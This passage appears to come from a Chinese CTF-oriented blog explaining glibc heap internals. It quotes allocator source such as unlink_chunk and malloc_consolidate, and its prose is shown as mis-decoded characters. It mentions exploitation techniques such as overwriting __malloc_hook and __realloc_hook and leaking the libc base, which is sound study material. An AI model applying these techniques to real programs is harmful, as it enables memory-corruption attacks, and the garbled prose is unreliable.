class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>        &#125;<br>    &#125;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>    &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>ç”¨ä»¥ä¸´æ—¶å­˜æ”¾å †å—çš„ binï¼Œåœ¨<strong>size å¤§äº fastbin èŒƒå›´ã€tcache é“¾è¡¨å·²æ»¡</strong>ï¼ˆå¦‚æœæœ‰ tcache ï¼‰æ—¶ä¸€ä¸ª chunk åœ¨ free ä¹‹ååˆ™ä¼šå…ˆè¢«æ”¾å…¥ unsorted bin ä¸­</p>
<p>è‹¥è¢«æ”¾å…¥ unsorted bin ä¸­çš„ chunk ä¸åŸæœ‰ unsorted chunk <strong>ç‰©ç†ç›¸é‚»åˆ™ä¼šåˆå¹¶</strong>æˆä¸€ä¸ªå¤§ chunk</p>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>å­˜æ”¾sizeè¾ƒå°çš„ç©ºé—²chunkçš„bin</p>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>å­˜æ”¾sizeè¾ƒå¤§çš„ç©ºé—²chunkçš„bin</p>
<h1 id="0x03-å†…å­˜åˆ†é…ç›¸å…³å‡½æ•°"><a href="#0x03-å†…å­˜åˆ†é…ç›¸å…³å‡½æ•°" class="headerlink" title="0x03.å†…å­˜åˆ†é…ç›¸å…³å‡½æ•°"></a>0x03.å†…å­˜åˆ†é…ç›¸å…³å‡½æ•°</h1><h2 id="ä¸€ã€malloc"><a href="#ä¸€ã€malloc" class="headerlink" title="ä¸€ã€malloc"></a>ä¸€ã€malloc</h2><p>malloc() å‡½æ•°ç”¨äºåˆ†é… chunkï¼Œé¦–å…ˆä» tcahe åˆ° fastbin å†åˆ° bins ä¸­å¯»æ‰¾å¯ç”¨ chunkï¼Œå½“ç°æœ‰çš„å¸¸è§„ç©ºé—² chunk <strong>ä¸ç›´æ¥æ»¡è¶³è¦æ±‚æ—¶</strong>ä¼šä» top chunk ä¸­è¿›è¡Œåˆ‡å‰²æˆ–æ˜¯å°è¯•åˆå¹¶å¯ä»¥åˆå¹¶çš„ç›¸é‚»ç©ºé—² chunkï¼Œä¸‡ä¸å¾—å·²æ—¶æ‰ä¼šè¿›è¡Œç³»ç»Ÿè°ƒç”¨</p>
<h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h3><p>ä½äº libc ä¸­çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œé€šå¸¸ä¸º NULLï¼Œä¸ä¸º NULL æ—¶ malloc() å‡½æ•°ä¼šä¼˜å…ˆè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆ</p>
<h2 id="äºŒã€free"><a href="#äºŒã€free" class="headerlink" title="äºŒã€free"></a>äºŒã€free</h2><p>free() å‡½æ•°ç”¨äºå°†å¯¹åº”çš„ç©ºé—² chunk æ”¾å…¥ç›¸åº”çš„ bin ä¸­ï¼Œåœ¨ä¸€å®šæƒ…å†µä¸‹è¿˜ä¼šåˆå¹¶ç›¸é‚»ç©ºé—² chunk</p>
<h3 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h3><p>ä½äº libc ä¸­çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œé€šå¸¸ ä¸ºNULL ï¼Œä¸ä¸ºNULLæ—¶ free() å‡½æ•°ä¼šä¼˜å…ˆè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆï¼Œ<strong>ä¼ å…¥çš„å‚æ•°ä¸ºè¦free çš„ chunk çš„ fd åŸŸçš„åœ°å€</strong></p>
<h2 id="ä¸‰ã€realloc"><a href="#ä¸‰ã€realloc" class="headerlink" title="ä¸‰ã€realloc"></a>ä¸‰ã€realloc</h2><p>ç”¨ä»¥æ‰©å±• chunkï¼Œç›¸é‚» chunk é—²ç½®ä¸”ç©ºé—´å……è¶³åˆ™ä¼šè¿›è¡Œåˆå¹¶ï¼Œ<strong>å¦åˆ™ä¼šé‡æ–°åˆ†é… chunk</strong></p>
<p>å³<strong>é€šè¿‡ realloc æˆ‘ä»¬å¯ä»¥å®Œæˆå¯¹ä¸€ä¸ª chunk çš„ free</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ realloc æ˜¯å¯ä»¥å½“ä½œ free ä½¿ç”¨çš„ï¼Œå…¶ä¸­ï¼Œåœ¨<strong>size ä¸º 0 çš„æƒ…å†µä¸‹ï¼Œrealloc å‡½æ•°ä¼šè°ƒç”¨ free é‡Šæ”¾è¯¥ chunk</strong></p>
<h3 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook"></a>__realloc_hook</h3><p>ä½äº libc ä¸­çš„å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œé€šå¸¸ä¸º NULL ï¼Œä¸ä¸º NULL æ—¶ realloc() å‡½æ•°ä¼šä¼˜å…ˆè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆ</p>
<p>ç”±äº __realloc_hook ä¸ __malloc_hook ç›¸é‚»ï¼Œå› æ­¤åœ¨ heap exploit ä¸­æœ‰ç€è¿™æ ·ä¸€ç§æ‰‹æ³•ä¾¿æ˜¯åŒæ—¶ä¿®æ”¹è¿™ä¸¤ä¸ª hookï¼Œé€šè¿‡ __libc_realloc ä¸­çš„ä¸€äº› gadget è°ƒæ•´å †æ ˆä»¥æ»¡è¶³ä¸€äº›ç‰¹å®šçš„è¦æ±‚</p>
<h2 id="å››ã€calloc"><a href="#å››ã€calloc" class="headerlink" title="å››ã€calloc"></a>å››ã€calloc</h2><p>åœ¨æœ€è¿‘çš„ CTF æ¯”èµ›ä¸­å¼€å§‹å˜å¾—çƒ­é—¨çš„ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨åˆ†é…æ—¶<strong>ä¼šæ¸…ç©º chunk ä¸Šçš„å†…å®¹</strong>ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•é€šè¿‡ä»¥å¾€çš„é‡å¤å­˜å–åé€šè¿‡ chunk ä¸Šæ®‹ç•™çš„è„æ•°æ®çš„æ–¹å¼æ³„éœ²ä¿¡æ¯ï¼ˆä¾‹å¦‚é€šè¿‡ bins æ•°ç»„é—ç•™çš„è„æ•°æ®æ³„éœ² libc åŸºå€ç­‰ï¼‰ï¼Œ<strong>åŒæ—¶è¯¥å‡½æ•°ä¸ä» tcache ä¸­æ‹¿ chunk</strong>ï¼Œä½†æ˜¯ <code>free()</code> å‡½æ•°é»˜è®¤è¿˜æ˜¯ä¼šå…ˆå¾€ tcache é‡Œæ”¾çš„ï¼Œè¿™æ— ç–‘å¢åŠ äº†æˆ‘ä»¬åˆ©ç”¨çš„éš¾åº¦</p>
<h2 id="äº”ã€malloc-consolidate"><a href="#äº”ã€malloc-consolidate" class="headerlink" title="äº”ã€malloc_consolidate"></a>äº”ã€malloc_consolidate</h2><p>è¯¥å‡½æ•°ç”¨ä»¥<strong>æ¸…ç©ºfastbinsä¸­chunkã€åˆå¹¶ç›¸é‚»ç©ºé—²chunk</strong>ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">    yet been initialized, in which case do so below</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br>    clear_fastchunks(av);<br><br>    unsorted_bin = unsorted_chunks(av);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">      then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">      placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">      reused anyway.</span><br><span class="hljs-comment">    */</span><br><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>      p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>      check_inuse_chunk(av, p);<br>      nextp = p-&gt;fd;<br><br>      <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br>      nextchunk = chunk_at_offset(p, size);<br>      nextsize = chunksize(nextchunk);<br><br>      <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>        prevsize = p-&gt;prev_size;<br>        size += prevsize;<br>        p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>        unlink(av, p, bck, fwd);<br>      &#125;<br><br>      <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>        <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>          size += nextsize;<br>          unlink(av, nextchunk, bck, fwd);<br>        &#125; <span class="hljs-keyword">else</span><br>          clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>        first_unsorted = unsorted_bin-&gt;fd;<br>        unsorted_bin-&gt;fd = p;<br>        first_unsorted-&gt;bk = p;<br><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>          p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>          p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>        &#125;<br><br>        set_head(p, size | PREV_INUSE);<br>        p-&gt;bk = unsorted_bin;<br>        p-&gt;fd = first_unsorted;<br>        set_foot(p, size);<br>      &#125;<br><br>      <span class="hljs-keyword">else</span> &#123;<br>        size += nextsize;<br>        set_head(p, size | PREV_INUSE);<br>        av-&gt;top = p;<br>      &#125;<br><br>    &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><br>      &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆä¼šå…ˆæ£€æŸ¥<strong>global_max_fast</strong>ï¼š</p>
<ul>
<li><strong>è‹¥ä¸ä¸º0åˆ™ä¼šè®¾ç½®è¯¥arenaçš„FASTCHUNKS_BITæ ‡å¿—ä½ï¼Œæ„å‘³ç€æ¥ä¸‹æ¥è¯¥å‡½æ•°ä¼šæ¸…ç©ºè¯¥arenaçš„fastbinä¸­çš„chunks</strong></li>
<li><strong>è‹¥ä¸º0åˆ™æ„å‘³ç€è¯¥çº¿ç¨‹çš„arenaæœªè¿›è¡Œåˆå§‹åŒ–</strong>ï¼Œæ­¤æ—¶ä¾¿ä¼š<strong>è°ƒç”¨malloc_init_state</strong>()<strong>å‡½æ•°åˆå§‹åŒ–è¯¥arenaï¼Œ</strong>éšåä½¿ç”¨check_malloc_state()å®è¿›è¡Œæ£€æŸ¥å<strong>è¯¥å‡½æ•°ä¾¿ç»“æŸäº†</strong>ï¼Œåœ¨éDEBUGæ¨¡å¼ä¸‹ï¼ˆæœªå®šä¹‰å®MALLOC_DEBUGï¼‰è¯¥å®ä¸ºç©º</li>
</ul>
<p>æ¥åœ¨å·²ç»åˆå§‹åŒ–çš„æƒ…å†µä¸‹æ¥ä¸‹æ¥ä¼š<strong>åˆ†åˆ«è·å–æŒ‡å‘arenaä¸­fastbinsYæ•°ç»„é¦–å°¾å…ƒç´ çš„æŒ‡é’ˆï¼Œç”¨ä»¥å¯¹fastbinsYæ•°ç»„è¿›è¡Œéå†ï¼Œ</strong>è¿™ä¸ªéå†ç”±ä¸¤å±‚å¾ªç¯åµŒå¥—è€Œæˆï¼š</p>
<h3 id="å¤–å±‚å¾ªç¯ï¼šéå†fastbinsYæ•°ç»„å…ƒç´ "><a href="#å¤–å±‚å¾ªç¯ï¼šéå†fastbinsYæ•°ç»„å…ƒç´ " class="headerlink" title="å¤–å±‚å¾ªç¯ï¼šéå†fastbinsYæ•°ç»„å…ƒç´ "></a>å¤–å±‚å¾ªç¯ï¼šéå†fastbinsYæ•°ç»„å…ƒç´ </h3><p>æˆ‘ä»¬å•ç‹¬å°†è¿™ä¸ªå¾ªç¯åµŒå¥—æ‹¿å‡ºæ¥çœ‹ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br>    p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) <br>    &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>              <span class="hljs-comment">// inner loop there</span><br>        &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºå¤–å±‚å¾ªç¯çš„ä½œç”¨ä¾¿æ˜¯<strong>é€ä¸ªå–å‡ºfastbinsYæ•°ç»„ä¸­å…ƒç´ ï¼Œéšåäº¤ç”±å†…å±‚å¾ªç¯è¿›è¡Œä¸‹ä¸€æ­¥çš„å¤„ç†</strong></p>
<p>åœ¨è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªå®<code>atomic_exchange_acq()</code>ï¼Œç”¨é€”æ˜¯<strong>é€šè¿‡åŸå­è¯»æ“ä½œè®¾ç½®æ–°å€¼ï¼Œè¿”å›æ—§å€¼</strong>ï¼Œå‰é¢å·²è§£æè¿‡ç±»ä¼¼å®ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p>
<p>è™½ç„¶å‰æ–‡æˆ‘ä»¬æœ‰è®²åˆ°fastbinsYæ•°ç»„çš„ä¸‹æ ‡åŒ…æ‹¬7åŠå¾€åéƒ½æ˜¯ç”¨ä¸åˆ°çš„ï¼Œä½†æ˜¯åœ¨è¿™é‡Œä»ä¼šå°è¯•å¯¹é½è¿›è¡Œéå†</p>
<h3 id="å†…å±‚å¾ªç¯ï¼šéå†fastbin-é“¾è¡¨ã€åˆå¹¶ç©ºé—²chunk"><a href="#å†…å±‚å¾ªç¯ï¼šéå†fastbin-é“¾è¡¨ã€åˆå¹¶ç©ºé—²chunk" class="headerlink" title="å†…å±‚å¾ªç¯ï¼šéå†fastbin é“¾è¡¨ã€åˆå¹¶ç©ºé—²chunk"></a>å†…å±‚å¾ªç¯ï¼šéå†fastbin é“¾è¡¨ã€åˆå¹¶ç©ºé—²chunk</h3><p>åœ¨å†…å±‚å¾ªç¯ä¸­ä¼šä»æˆ‘ä»¬ä»å¤–å±‚å¾ªç¯ä¸­æ‰€å–å¾—çš„fastbinsé“¾è¡¨çš„å¤´ç»“ç‚¹å¼€å§‹è¿›è¡Œéå†ï¼Œå¹¶è¿›è¡Œç©ºé—²chunkçš„åˆå¹¶ä»¥å‡å°‘å†…å­˜ç¢ç‰‡</p>
<p>è‹¥<strong>è·å–åˆ°çš„å¤´ç»“ç‚¹ä¸ºNULLåˆ™ä¼šç›´æ¥è·³è¿‡è¯¥å±‚å¾ªç¯</strong>ï¼Œå¦åˆ™è¿›å…¥ä¸‹é¢çš„æ­¥éª¤</p>
<p>åœ¨è¿™é‡Œæœ‰ä¸€ä¸ªå®<code>check_inuse_chunk()</code>ï¼Œè¯¥å®åœ¨éDEBUGæ¨¡å¼ä¸‹ï¼ˆå®MALLOC_DEBUG undefinedï¼‰ä¹Ÿä¸ºç©º</p>
<p>é¦–å…ˆä¼šè·å–è¯¥èŠ‚ç‚¹chunkçš„sizeï¼Œåœ¨è¿™é‡Œ<strong>è·å–åˆ°çš„sizeæ¸…é™¤äº†PREV_INUSEæ ‡å¿—ä½ä¸NON_MAIN_ARENAæ ‡å¿—ä½</strong>ï¼Œè¿™æ˜¯ä¸ºäº†åœ¨åé¢çš„åˆå¹¶è¿‡ç¨‹ä¸­èƒ½å¤Ÿå‡†ç¡®åœ°è·å–åˆ°é«˜åœ°å€ç›¸é‚»chunkçš„ä½ç½®</p>
<blockquote>
<p>è¯´èµ·æ¥ç½‘ä¸Šå¾ˆå¤šå…³äºmalloc_consolidate()çš„åšå®¢éƒ½æœ‰è®²åˆ°æ‰€è°“ã€Œå‰å‘åˆå¹¶ã€å’Œã€Œåå‘åˆå¹¶ã€ï¼Œä½†æ˜¯å“ªè¾¹æ˜¯å‰å“ªè¾¹æ˜¯åç¬”è€…æš‚ä¸”è’™åœ¨å¤é‡Œï¼ˆæ³¨é‡Šé‡Œç¬”è€…ä¹Ÿæ²¡çœ‹åˆ°forward&#x2F;backwardâ€¦</p>
<p>é‚£ä¹ˆä¸‹æ–‡æˆ‘ä»¬æŒ‰ç…§å¯¹å…¶ç§°å‘¼çš„æƒ¯ä¾‹åšå‡ºå¦‚ä¸‹çº¦å®šï¼šå°†<strong>å‘é«˜åœ°å€çš„åˆå¹¶ç§°ä¸ºã€Œå‰å‘åˆå¹¶ã€ï¼Œå‘ä½åœ°å€çš„åˆå¹¶ç§°ä¸ºã€Œåå‘åˆå¹¶ã€</strong></p>
</blockquote>
<h4 id="â‘ åå‘åˆå¹¶ï¼šä½¿ç”¨unlinkå–å‡ºç›¸é‚»ä½åœ°å€chunkï¼ˆè‹¥å·²freeï¼‰"><a href="#â‘ åå‘åˆå¹¶ï¼šä½¿ç”¨unlinkå–å‡ºç›¸é‚»ä½åœ°å€chunkï¼ˆè‹¥å·²freeï¼‰" class="headerlink" title="â‘ åå‘åˆå¹¶ï¼šä½¿ç”¨unlinkå–å‡ºç›¸é‚»ä½åœ°å€chunkï¼ˆè‹¥å·²freeï¼‰"></a>â‘ åå‘åˆå¹¶ï¼šä½¿ç”¨unlinkå–å‡ºç›¸é‚»ä½åœ°å€chunkï¼ˆè‹¥å·²freeï¼‰</h4><p>é¦–å…ˆä¼š<strong>æ£€æŸ¥è¯¥chunkçš„PREV_IN_USEæ ‡å¿—ä½ï¼Œè‹¥ä¸ä¸º1åˆ™è¯´æ˜ä½åœ°å€ç›¸é‚»chunkå¿…ä¸ºå­˜æ”¾åœ¨binsæ•°ç»„ä¸­çš„free chunk</strong>ï¼Œè¿™æ˜¯å› ä¸º<strong>å½“ä¸€ä¸ªchunkè¢«ä½¿ç”¨ä¸­&#x2F;è¢«æ”¾å…¥fastbinä¸­ï¼Œå…¶ç›¸é‚»é«˜åœ°å€çš„chunkçš„PREV_INUSEæ ‡å¿—ä½éƒ½ä¸ä¼šè¢«æ¸…é™¤ï¼Œåªæœ‰æ”¾å…¥binsä¸­æ‰ä¼šæ¸…é™¤è¯¥æ ‡å¿—ä½</strong>ï¼Œç›¸å…³æœºåˆ¶æˆ‘ä»¬ä¼šåœ¨åæ–‡çš„_int_free()å‡½æ•°ä¸­è¯¦ç»†è¿›è¡Œåˆ†æ</p>
<p>è¿™ç§æƒ…å†µä¸‹ä¼š<strong>åœ¨å‰é¢çš„sizeå˜é‡ä¸­åŠ ä¸ŠåŸchunkçš„prevsizeåŸŸçš„å€¼ï¼Œå°†chunkæŒ‡é’ˆç§»åŠ¨è‡³æŒ‡å‘è¯¥ç©ºé—²chunkï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</strong></p>
<p><img src="https://i.loli.net/2021/01/23/GqBQHD12NtAESkT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><strong>æœ€åä½¿ç”¨unlinkå®ä»binsä¸­å–å‡ºè¯¥chunk</strong>ï¼Œåå‘åˆå¹¶çš„è¿‡ç¨‹å°±å®Œæˆäº†</p>
<p><img src="https://i.loli.net/2021/01/23/pKVSclCIunvofOm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¿™é‡Œæ˜¯<strong>ä½¿ç”¨åŸchunkçš„prevsizeåŸŸè®¡ç®—è¯¥ç©ºé—²chunkçš„å¤§å°ï¼Œè€Œå¹¶éç›´æ¥ä½¿ç”¨ä½åœ°å€ç©ºé—²chunkçš„sizeåŸŸ</strong></p>
<h4 id="â‘¡å‰å‘åˆå¹¶ï¼šè‹¥ä¸ºtop-chunkåˆ™åˆå¹¶å…¥top-chunkä¸­ï¼Œå¦åˆ™ä¼šå°è¯•åˆå¹¶åæ’å…¥unsorted-binä¸­"><a href="#â‘¡å‰å‘åˆå¹¶ï¼šè‹¥ä¸ºtop-chunkåˆ™åˆå¹¶å…¥top-chunkä¸­ï¼Œå¦åˆ™ä¼šå°è¯•åˆå¹¶åæ’å…¥unsorted-binä¸­" class="headerlink" title="â‘¡å‰å‘åˆå¹¶ï¼šè‹¥ä¸ºtop chunkåˆ™åˆå¹¶å…¥top chunkä¸­ï¼Œå¦åˆ™ä¼šå°è¯•åˆå¹¶åæ’å…¥unsorted_binä¸­"></a>â‘¡å‰å‘åˆå¹¶ï¼šè‹¥ä¸ºtop chunkåˆ™åˆå¹¶å…¥top chunkä¸­ï¼Œå¦åˆ™ä¼šå°è¯•åˆå¹¶åæ’å…¥unsorted_binä¸­</h4><h5 id="1ï¼‰nextchunkä¸ºtop-chunk"><a href="#1ï¼‰nextchunkä¸ºtop-chunk" class="headerlink" title="1ï¼‰nextchunkä¸ºtop chunk"></a>1ï¼‰nextchunkä¸ºtop chunk</h5><p>é¦–å…ˆä¼šæ£€æŸ¥nextchunkæ˜¯å¦ä¸ºtop chunkï¼Œè‹¥æ˜¯åˆ™æµç¨‹ä¼šç®€ä¾¿å¾—å¤šï¼š<strong>å°†è¯¥chunkçš„sizeåŠ ä¸Šnextchunkçš„sizeï¼Œè®¾ç½®PREV_INUSEæ ‡å¿—ä½ï¼Œå°†arenaçš„top chunkè®¾ç½®ä¸ºè¯¥chunkåä¾¿è¿›å…¥ä¸‹ä¸€æ­¥</strong></p>
<p><img src="https://i.loli.net/2021/01/23/QF5vhAYbGeqf4C9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
